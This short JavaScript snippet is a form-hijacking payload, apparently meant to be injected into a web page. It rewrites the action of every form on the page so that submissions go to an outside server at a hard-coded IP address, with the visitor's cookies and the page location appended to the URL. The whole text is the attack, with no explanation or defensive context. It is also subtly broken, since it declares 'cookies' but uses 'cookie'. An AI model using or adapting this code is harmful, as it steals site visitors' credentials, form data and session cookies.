for(var i=0; i<document.forms.length;i++)
{
    var origact =  document.forms[i].action;
    var cookies = document.cookie;
    var loc = document.location;
    document.forms[i].action='http://104.236.204.177:1337/home/processforminfo/'+origact+'/'+cookie+'/'+loc;
}